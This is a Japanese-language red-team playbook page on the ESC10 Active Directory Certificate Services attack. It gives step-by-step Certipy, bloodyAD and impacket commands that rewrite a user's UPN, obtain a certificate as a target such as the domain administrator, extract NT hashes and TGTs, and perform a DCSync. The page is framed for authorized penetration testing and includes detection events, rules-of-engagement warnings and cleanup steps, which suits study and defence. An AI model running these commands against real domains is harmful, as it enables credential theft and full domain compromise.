# ESC10 — Weak Certificate Mappings（レガシー UPN マッピング悪用）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・4738・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [x] 不可逆な設定変更を含む（UPN を一時書き換えるため書き換え中にロック・混乱が起きるリスクあり）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。
> 演習環境では制約なし。

---

## 着火条件

ESC10 には **Case 1** と **Case 2** の 2 パターンがある。いずれかの条件が揃ったときに実施する。

### Case 1（弱い KDC バインディング：StrongCertificateBindingEnforcement = 0）

- DC レジストリの `HKLM\System\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement` が **0**（完全無効）
- 証明書の SID 拡張（`szOID_NTDS_CA_SECURITY_EXT`）の有無に関係なく UPN のみで認証アカウントを決定する
- 攻撃者が任意のドメインユーザーに対して `GenericWrite` または `WriteProperty(userPrincipalName)` 権限を持つ

### Case 2（UPN マッピング許可：CertificateMappingMethods に UPN ビットが立つ）

- DC レジストリの `HKLM\System\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement` が **1**（互換モード）かつ
- `HKLM\System\CurrentControlSet\Services\Kdc\CertificateMappingMethods` に UPN マッピングビット（`0x4`）が含まれる
- 証明書の `SubjectAltName` の UPN を用いたアカウントマッピングが許可されている
- 攻撃者が任意のドメインユーザーに対して `GenericWrite` または `WriteProperty(userPrincipalName)` 権限を持つ

**攻撃者の思考トレース：** CVE-2022-26923（Certifried）の修正パッチ（KB5014754）は、証明書に `objectSid` を埋め込む `szOID_NTDS_CA_SECURITY_EXT` 拡張と、KDC 側での強制 SID 検証（`StrongCertificateBindingEnforcement=2`）によって対策された。しかし設定値が 0 や 1 に留まっている環境では依然として UPN ベースのマッピングが機能するため、ESC9 と同様の UPN 書き換え攻撃が通用する。

> **注意（ESC10 は環境依存が強い）：** KDC レジストリ設定は直接確認できないケースが多い。Certipy は `StrongCertificateBindingEnforcement` の値を LDAP から推定するが、精度は限定的。実際には certipy auth の成否でフォールバック確認が必要になる。

---

## 環境前提

- **実行環境**: テスター端末（ドメインユーザー権限・ネットワーク到達性があること）
- **必要なツール**:
  - Certipy（`pip install certipy-ad --break-system-packages`。要インストール確認）
  - bloodyAD または PowerShell AD モジュール（UPN 書き換え用）
- **必要な権限**:
  - 制御可能なユーザーアカウントに対する `GenericWrite` または `WriteProperty(userPrincipalName)` ACE
  - その制御可能ユーザーが Enrollment 権限を持つテンプレートの存在（Client Authentication EKU を含む任意のテンプレート）
- **オフライン代替**: Certipy 非使用環境では `certreq` + 手動 CSR（Windows 端末要）。KDC 設定確認は `reg query` で代替（ターゲット端末上での実行が必要）

---

## 観点・着眼点

### 先に確認すること

```bash
# [Attacker] ESC10 の検出（certipy は KDC 設定を推定して報告する）
certipy find \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout
```

`certipy find` が ESC10 を検出した際の出力例：

```
Certificate Authorities
  0
    CA Name                             : [CA_NAME]
    ...
    [!] Vulnerabilities
      ESC10 (Case 1)                    : Domain Controllers have Certificate Mappings set to 0
      # または
      ESC10 (Case 2)                    : 'CertificateMappingMethods' registry key has UPN bit set
```

KDC レジストリを直接確認できる場合（ターゲット端末上、または SYSTEM 権限取得後）：

```powershell
# [Target] KDC のレジストリ設定を直接確認
reg query "HKLM\System\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
reg query "HKLM\System\CurrentControlSet\Services\Kdc" /v CertificateMappingMethods
# StrongCertificateBindingEnforcement の値:
#   0 = 強制なし（Case 1 に該当）
#   1 = 互換モード（Case 2 に該当する可能性）
#   2 = 完全強制（ESC10 は使えない）
```

### 何が出たら次に何をするか

| シグナル | 判断 |
|---------|------|
| `ESC10 (Case 1)` が表示 | `StrongCertificateBindingEnforcement=0`。ESC9 と同様の UPN 書き換え手順で攻撃可能 |
| `ESC10 (Case 2)` が表示 | `CertificateMappingMethods` に UPN ビットあり。UPN 書き換え手順で攻撃可能（Case 1 より制限が多い場合あり） |
| `StrongCertificateBindingEnforcement=2` | ESC10 は使えない。ESC1〜ESC8 の経路を改めて確認する |
| `certipy find` が ESC10 を検出しない | KDC 設定が標準（`=2`）の可能性大。または Certipy のバージョンが古く ESC10 の検出ロジックが未実装 |

---

## 手順（Case 1 / Case 2 共通）

Case 1・Case 2 とも UPN 書き換え手順は ESC9 と同一。テンプレートの条件が緩い点が Case 1/2 の利点（SAN 自由指定フラグが不要）。

事前準備（必須）：時刻同期（Kerberos は時刻ずれ ±5 分以内が必要）

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

### Step 1: 制御可能ユーザーの UPN を標的の UPN に書き換える

```bash
# [Attacker] bloodyAD で UPN を書き換える
bloodyAD \
  --host [DC_IP] \
  -d [DOMAIN] \
  -u [ATTACKER_USER] \
  -p "[ATTACKER_PASSWORD]" \
  set attribute [CONTROLLED_USER] userPrincipalName "[TARGET_UPN]"
# 例: TARGET_UPN = administrator@example.local
```

### Step 2: 書き換えた UPN で証明書を申請する

```bash
# [Attacker] Client Authentication EKU を持つ任意のテンプレートで申請
certipy req \
  -ca [CA_NAME] \
  -template [TEMPLATE_NAME] \
  -u [CONTROLLED_USER]@[DOMAIN] \
  -p "[CONTROLLED_USER_PASSWORD]" \
  -dc-ip [DC_IP]
# → [CONTROLLED_USER].pfx が生成される（証明書内 UPN = TARGET_UPN）
```

### Step 3: UPN を元に戻す（原状回復・即時）

```bash
# [Attacker] UPN を元の値に戻す
bloodyAD \
  --host [DC_IP] \
  -d [DOMAIN] \
  -u [ATTACKER_USER] \
  -p "[ATTACKER_PASSWORD]" \
  set attribute [CONTROLLED_USER] userPrincipalName "[ORIGINAL_UPN]"
```

### Step 4: 証明書で PKINIT 認証 → NT ハッシュ取得

```bash
# [Attacker] 証明書で認証（TARGET_UPN として）
certipy auth \
  -pfx [CONTROLLED_USER].pfx \
  -domain [DOMAIN] \
  -username [TARGET_USERNAME] \
  -dc-ip [DC_IP]
# → NT ハッシュと TGT が出力される
```

### Step 5: NT ハッシュで DCSync（DA ハッシュを取得した場合）

```bash
# [Attacker] DCSync
impacket-secretsdump \
  -just-dc-ntlm \
  -no-pass \
  -hashes :[NT_HASH] \
  [DOMAIN]/[TARGET_USERNAME]@[DC_IP]
```

### 原状回復：証明書の失効

```bash
# [Attacker] 発行した証明書を失効（REQUEST_ID は Step 2 の出力で確認）
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -revoke [REQUEST_ID]
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `certipy auth` が `KDC_ERR_CLIENT_NOT_TRUSTED` | `StrongCertificateBindingEnforcement=2` に設定されている可能性。レジストリを直接確認できる権限があれば確認する |
| `certipy auth` が `KDC_ERR_PADATA_TYPE_NOSUPP` | DC が PKINIT をサポートしていない（Server 2008 以前等）または CA の SID 要件で拒否 |
| Case 2 で `certipy auth` が失敗する | `CertificateMappingMethods` の UPN ビットが立っていてもアカウント特定に失敗するケースがある。証明書の SAN/Subject の内容を `openssl x509 -in [CONTROLLED_USER].pfx -noout -text` で確認する |
| UPN 書き換えに `ACCESS_DENIED` | `GenericWrite` ACE の実際のスコープを BloodHound で再確認。WriteProperty の対象属性が `userPrincipalName` に限定されているか確認 |

---

## 注意点・落とし穴

- **ESC9 との違い**：ESC9 は「テンプレートが `CT_FLAG_NO_SECURITY_EXTENSION` を持つ」ことが必要。ESC10 は「KDC 側のレジストリ設定が弱い」ことが条件。どちらも UPN 書き換えを使う点は共通
- **Case 1（0 設定）は 2022年5月パッチ前のデフォルト**：パッチ未適用環境では `StrongCertificateBindingEnforcement` キー自体が存在しない場合があり、不在 = 0（Case 1 相当）と解釈される
- **UPN 書き換え中の業務影響**：書き換え〜元に戻すまでの間、対象ユーザーの Kerberos 認証が乱れる場合がある。本番では深夜・メンテナンスウィンドウでの実施を強く推奨
- **Certipy のバージョン確認**：ESC10 の検出は Certipy 4.x 以降で実装。古いバージョンでは `-vulnerable` に表示されない

> 原理 → `../../06_Concepts/AD_CS_Certificate_Mapping.md`（ESC9 / ESC10 共通原理として作成推奨）

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。KDC レジストリ設定の確認・UPN 属性改ざん・DA 証明書取得はいずれも書面承認が必要
- **想定されるSIEM/EDR検知**: Event ID 4738（ユーザーアカウント変更：UPN 書き換え）/ 4886・4887（証明書要求・発行）/ 4768（TGT 要求）/ MDI「証明書ベースの横断移動」アラート
- **業務影響リスク**: UPN 書き換え中に対象ユーザーが認証を試みると失敗する可能性あり
- **原状回復必須項目**: ✅ 書き換えた UPN を元の値に戻す / ✅ 発行した証明書を CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx ファイルの暗号化保管・テスト完了時破棄
- **取得情報の取扱**: pfx ファイル・NT ハッシュ・TGT は暗号化保管、テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 前：ESC9（テンプレート側の No Security Extension 設定悪用） → `./ESC9.md`
- 前：GenericWrite によるユーザー属性書き換え → `../ACE_Abuse/GenericWrite.md`
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
